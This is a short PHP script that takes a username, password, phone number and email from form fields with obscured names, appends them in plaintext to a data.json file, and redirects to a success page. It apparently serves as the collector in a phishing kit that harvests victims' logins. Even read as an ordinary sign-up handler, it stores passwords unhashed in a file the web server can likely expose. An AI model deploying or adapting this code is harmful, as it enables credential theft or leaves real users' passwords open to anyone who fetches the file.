<?php
// Load existing data from JSON file
$jsonFile = 'data.json';
$jsonData = file_get_contents($jsonFile);
$data = json_decode($jsonData, true);

// Get form data
$username = $_POST['zwous'];
$password = $_POST['zwoup'];
$phoneNumber = $_POST['zwopho'];
$email = $_POST['zwomai'];

// Add user data to the array
$data[] = array(
    "username" => $username,
    "password" => $password,
    "phoneNumber" => $phoneNumber,
    "email" => $email
);

// Encode the updated data and save to JSON file
$updatedJsonData = json_encode($data, JSON_PRETTY_PRINT);
file_put_contents($jsonFile, $updatedJsonData);

// Redirect to a success page
header('Location: success_page.html');
exit();
?>
